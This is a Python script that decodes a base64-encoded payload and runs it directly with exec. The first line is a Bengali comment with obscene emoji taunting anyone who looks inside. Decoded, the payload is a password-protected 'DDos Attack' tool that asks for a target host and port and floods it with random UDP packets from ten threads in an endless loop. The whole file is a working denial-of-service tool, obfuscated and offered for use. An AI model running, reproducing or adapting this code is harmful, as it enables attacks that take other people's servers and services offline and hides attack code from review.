#ব ল দ script এ কি দেখস 🖕🖕🖕🖕

import base64

# Base64 encoded content
encoded_content = '''IyEvdXNyL2Jpbi9weXRob24zCiMgVGhpcyBjb2RlIHdyaXRlIGJ5IChNci5ub3BlKQojIEREb3MgQXR0YWNrIHYyLjAuMAppbXBvcnQgb3MKdHJ5OgogICAgZnJvbSBjb2xvcmFtYSBpbXBvcnQgRm9yZSwgaW5pdAogICAgaW5pdCgpCmV4Y2VwdCBJbXBvcnRFcnJvcjoKICAgIG9zLnN5c3RlbSgicGlwMyBpbnN0YWxsIGNvbG9yYW1hIikKaW1wb3J0IHRpbWUKaW1wb3J0IHN5cwppbXBvcnQgc29ja2V0CmltcG9ydCB0aHJlYWRpbmcKaW1wb3J0IHBsYXRmb3JtCmltcG9ydCByYW5kb20KCnN5c3RlbSA9IHBsYXRmb3JtLnVuYW1lKClbMF0KCiMgRGVmaW5lIGEgcGFzc3dvcmQKUEFTU1dPUkQgPSAiQURpIiAgIyBDaGFuZ2UgdGhpcyB0byB5b3VyIGRlc2lyZWQgcGFzc3dvcmQKMQpkZWYgdGl0bGUoKToKICAgIGlmIHN5c3RlbSA9PSAnTGludXgnOgogICAgICAgIG9zLnN5c3RlbSgicHJpbnRmICdcMDMzXTI7RERvcy1BdHRhY2tcYSciKQogICAgZWxpZiBzeXN0ZW0gPT0gJ1dpbmRvd3MnOgogICAgICAgIG9zLnN5c3RlbSgidGl0bGUgRERvcy1BdHRhY2siKQogICAgZWxzZToKICAgICAgICBwcmludCgiXG5QbGVhc2UsIFJ1biBUaGlzIHByb2dyYW0gb24gTGludXgsIFdpbmRvd3MsIG9yIE1hY09TIVxuIikKICAgICAgICBzeXMuZXhpdCgpCgpkZWYgY2xzKCk6CiAgICBpZiBzeXN0ZW0gPT0gJ1dpbmRvd3MnOgogICAgICAgIG9zLnN5c3RlbSgiY2xzIikKICAgIGVsaWYgc3lzdGVtID09ICdMaW51eCc6CiAgICAgICAgb3Muc3lzdGVtKCJjbGVhciIpCiAgICBlbHNlOgogICAgICAgIHByaW50KCJcblBsZWFzZSwgUnVuIFRoaXMgcHJvZ3JhbSBvbiBMaW51eCwgV2luZG93cywgb3IgTWFjT1MhXG4iKQogICAgICAgIHN5cy5leGl0KCkKCmNsYXNzIGNvbG9yOgogICAgcmVkID0gJ1wwMzNbOTFtJwogICAgZ3JlZW4gPSAnXDAzM1s5Mm0nCiAgICBFbmQgPSAnXDAzM1swbScKICAgIGJsdWUgPSAnXDAzM1szM20nCgpkZWYgbWVudSgpOgogICAgdGl0bGUoKQogICAgY2xzKCkKICAgIHByaW50KGNvbG9yLnJlZCArICIiIgogICAgIF9fX19fXyAgIF9fX19fXyAgIF9fX19fX18gIF9fX19fX18gICAgICAgICBfX19fX19fICBfX19fX19fICBfX19fX19fICBfX19fX19fICBfX19fX19fICBfX18gICBfCiAgICB8ICAgICAgfCB8ICAgICAgfCB8ICAgICAgIHx8ICAgICAgIHwgICAgICAgfCAgIF8gICB8fCAgICAgICB8fCAgICAgICB8fCAgIF8gICB8fCAgICAgICB8fCAgIHwgfCB8CiAgICB8ICBfICAgIHx8ICBfICAgIHx8ICAgXyAgIHx8ICBfX19fX3wgX19fXyAgfCAgfF98ICB8fF8gICAgIF98fF8gICAgIF98fCAgfF98ICB8fCAgICAgICB8fCAgIHxffCB8CiAgICB8IHwgfCAgIHx8IHwgfCAgIHx8ICB8IHwgIHx8IHxfX19fXyB8X19fX3wgfCAgICAgICB8ICB8ICAgfCAgICB8ICAgfCAgfCAgICAgICB8fCAgICAgICB8fCAgICAgIF98CiAgICB8IHxffCAgIHx8IHxffCAgIHx8ICB8X3wgIHx8X19fX18gIHwgICAgICAgfCAgICAgICB8ICB8ICAgfCAgICB8ICAgfCAgfCAgICAgICB8fCAgICAgIF98fCAgICAgfF8KICAgIHwgICAgICAgfHwgICAgICAgfHwgICAgICAgfCBfX19fX3wgfCAgICAgICB8ICAgXyAgIHwgIHwgICB8ICAgIHwgICB8ICB8ICAgXyAgIHx8ICAgICB8XyB8ICAgIF8gIHwKICAgIHxfX19fX198IHxfX19fX198IHxfX19fX19ffHxfX19fX19ffCAgICAgICB8X198IHxfX3wgIHxfX198ICAgIHxfX198ICB8X198IHxfX3x8X19fX19fX3x8X19ffCB8X3xcbiIiIiArIGNvbG9yLmJsdWUgKyAiIiIKICAgICAgICAgLS0tLVsgICAgVGhpcyBjb2RlIHdyaXRlIGJ5IFNIT05DSE9ZT04gQkFSVUEgQURJUlRUQSAgIF0tLS0KICAgICAgICAtLS0tLS0tWyBnaXRodWIgOiIiIiArIGNvbG9yLmJsdWUgKyAiIiIgaHR0cHM6Ly9naXRodWIuY29tL0FESVJUVEEgXS0tLS0tLS0tLS0tIiIiICsgY29sb3IuRW5kKQoKICAgICMgUGFzc3dvcmQgcHJvdGVjdGlvbgogICAgdXNlcl9wYXNzd29yZCA9IGlucHV0KCJFbnRlciBwYXNzd29yZCB0byBjb250aW51ZTogIikKICAgIGlmIHVzZXJfcGFzc3dvcmQgIT0gUEFTU1dPUkQ6CiAgICAgICAgcHJpbnQoY29sb3IucmVkICsgIkluY29ycmVjdCBwYXNzd29yZCEgRXhpdGluZy4uLlxuIiArIGNvbG9yLkVuZCkKICAgICAgICBzeXMuZXhpdCgpCgogICAgaG9zdCA9IGlucHV0KCJcbkVudGVyIEhvc3Q6ICIpCiAgICB0aW1lLnNsZWVwKDEpCiAgICBwb3J0ID0gaW50KGlucHV0KCJcbkVudGVyIFRhcmdldCBwb3J0OiAiKSkKICAgICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiAgICBVRFBfUE9SVCA9IHBvcnQKICAgIGJzID0gcmFuZG9tLl91cmFuZG9tKDE0OTApCiAgICB0aW1lLnNsZWVwKDEpCiAgICBjbHMoKQogICAgaXAgPSBzb2NrZXQuZ2V0aG9zdGJ5bmFtZShob3N0KQogICAgcHJpbnQoY29sb3IucmVkICsgIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09XG4iICsgY29sb3IuRW5kKQogICAgcHJpbnQoIlRhcmdldCBJUDoiLCBpcCkKICAgIHRpbWUuc2xlZXAoMSkKICAgIHByaW50KCJcblRhcmdldCBwb3J0OiIsIFVEUF9QT1JUKQogICAgcHJpbnQoY29sb3IucmVkICsgIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09XG4iICsgY29sb3IuRW5kKQogICAgdGltZS5zbGVlcCgyKQogICAgc29jayA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX0RHUkFNKQoKICAgIGRlZiBydW4oayk6CiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgc29jay5zZW5kdG8oYnMsIChpcCwgcG9ydCkpCiAgICAgICAgICAgIHByaW50KGYie0ZvcmUuR1JFRU59U2VuZCBQYWNrZXQgVG8ge0ZvcmUuUkVEfXtpcH17Rm9yZS5XSElURX0iKQoKICAgIGZvciBpIGluIHJhbmdlKDEwKToKICAgICAgICBjaCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXJ1biwgYXJncz1baV0pCiAgICAgICAgY2guc3RhcnQoKQoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIHRyeToKICAgICAgICB0cnk6CiAgICAgICAgICAgIG1lbnUoKQogICAgICAgIGV4Y2VwdCBFT0ZFcnJvcjoKICAgICAgICAgICAgcHJpbnQoIlxuQ3RybCArIEQiKQogICAgICAgICAgICBwcmludCgiXG5FeGl0aW5nLi4uIikKICAgICAgICAgICAgc3lzLmV4aXQoKQogICAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OgogICAgICAgIHByaW50KCJcbkN0cmwgKyBDIikKICAgICAgICBwcmludCgiXG5FeGl0aW5nLi4uIikKICAgICAgICBzeXMuZXhpdCgpCiMgVGhhbmtzIEZvciB1c2luZyA6KQo='''

# Decode the base64 string
decoded_content = base64.b64decode(encoded_content).decode('utf-8')

# Execute the decoded content directly
exec(decoded_content)
